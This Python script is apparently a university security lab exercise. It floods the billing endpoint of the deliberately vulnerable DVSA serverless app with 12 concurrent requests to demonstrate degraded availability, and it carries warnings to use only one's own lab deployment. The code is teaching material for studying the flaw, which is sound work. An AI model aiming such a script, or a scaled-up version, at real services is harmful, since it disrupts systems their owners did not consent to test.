#!/usr/bin/env python3
"""
Lesson 6: Denial of Service - Controlled Concurrent Billing Test

Purpose:
    Sends one baseline billing request, then sends a small controlled batch of
    concurrent billing requests to demonstrate degraded availability in DVSA's
    billing path.

Safety:
    Use only against your own DVSA deployment in the ICS-344 lab environment.
    Do not increase the worker count unless your instructor explicitly asks.
    Do not run this in a loop.

Required environment variables:
    API      - DVSA /order API endpoint
    TOKEN    - Valid DVSA user authorization token
    ORDER_ID - Valid DVSA order ID currently suitable for billing test

Example:
    export API="https://REDACTED.execute-api.us-east-1.amazonaws.com/Stage/order"
    export TOKEN="REDACTED_VALID_USER_TOKEN"
    export ORDER_ID="REDACTED_ORDER_ID"
    python3 scripts/lesson-06/lesson6_dos_controlled.py
"""

import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    print("Missing dependency: requests")
    print("Install with: python3 -m pip install requests")
    sys.exit(1)


def require_env(name: str) -> str:
    value = os.environ.get(name, "").strip()
    if not value:
        print(f"Missing required environment variable: {name}")
        sys.exit(1)
    return value


API = require_env("API")
TOKEN = require_env("TOKEN")
ORDER_ID = require_env("ORDER_ID")

# Keep this controlled. Official DVSA Lesson 6 discusses a concurrency limit
# around the billing path. 12 workers is enough to test the issue without
# creating unnecessary load.
WORKERS = int(os.environ.get("L6_WORKERS", "12"))

HEADERS = {
    "content-type": "application/json",
    "authorization": TOKEN,
}

PAYLOAD = {
    "action": "billing",
    "order-id": ORDER_ID,
    "data": {
        "ccn": "4242424242424242",
        "exp": "11/2028",
        "cvv": "123",
    },
}


def summarize_body(text: str, limit: int = 220) -> str:
    text = text.replace("\n", "\\n").replace("\r", "\\r")
    return text[:limit]


def send_billing(label):
    start = time.time()
    try:
        response = requests.post(API, json=PAYLOAD, headers=HEADERS, timeout=20)
        elapsed = round(time.time() - start, 2)
        return label, response.status_code, elapsed, summarize_body(response.text)
    except Exception as exc:
        elapsed = round(time.time() - start, 2)
        return label, "ERR", elapsed, str(exc)


def main() -> None:
    print("[1] Baseline single billing request")
    print(send_billing("baseline"))

    print("\n[2] Controlled concurrent billing test")
    print(f"Workers: {WORKERS}")

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = [executor.submit(send_billing, i) for i in range(WORKERS)]
        for future in as_completed(futures):
            print(future.result())

    print("\n[3] Test completed")
    print("\nEvidence note:")
    print("- Ideal official symptom: 429 / TooManyRequestsException / Rate Exceeded.")
    print("- In our deployment, repeated 500/502 during concurrent billing was recorded")
    print("  as degraded availability in the billing path.")


if __name__ == "__main__":
    main()
